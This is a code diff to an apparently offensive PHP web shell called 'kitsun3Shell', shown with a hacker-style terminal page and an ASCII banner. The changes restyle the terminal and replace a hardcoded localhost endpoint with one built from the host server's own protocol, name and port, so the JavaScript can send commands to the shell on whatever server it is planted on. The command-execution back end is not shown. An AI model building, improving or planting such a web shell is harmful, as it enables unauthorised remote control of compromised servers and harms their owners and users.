@@ -33,7 +33,8 @@ main();
             body {
                 background-color: black;
                 color: #ff6666;
-                font-weight: bold;
+                font-size: medium ;
+                font-family: Consolas,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New, monospace;
             }
 
             span {
@@ -55,13 +56,23 @@ main();
                 font-weight: bolder;
                 outline: none;
             }
+
+            #terminal {
+                opacity: 0.6;
+                padding: 10px;
+                margin: 20px;
+                background-color:#312d28;
+                background-image:linear-gradient(-87deg, rgba(255,255,255,0.1) 0%,rgba(255,255,255,0.08) 49%,rgba(255,255,255,0.03)  51%,rgba(255,255,255,0) 100%);
+            }
         </style>
 
         <script>
 
             function makerequest(url, command){
                 var xhr = new XMLHttpRequest();
-                xhr.open("POST", 'http://localhost:1337/kitsun3Shell.php', true);
+                var protocol = "<?= $protocol = ($_SERVER['HTTPS'] && $_SERVER['HTTPS'] != 'off') ? 'https://' : 'http://' ?>";
+                var url = protocol + "<?= $_SERVER['SERVER_NAME'] .':'. $_SERVER['SERVER_PORT'] .'/kitsun3Shell.php' ?>";
+                xhr.open("POST", url, true);
 
                 // Envia a informação do cabeçalho junto com a requisição.
                 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
@@ -113,7 +124,6 @@ main();
  / //_/ | __/ __| | | | '_ \  |_ \\ \| '_ \ / _ \ | |
 / __ \| | |_\__ \ |_| | | | |___) |\ \ | | |  __/ | |
 \/  \/|_|\__|___/\__,_|_| |_|____/\__/_| |_|\___|_|_|
-
                 </div>
 
             </pre>
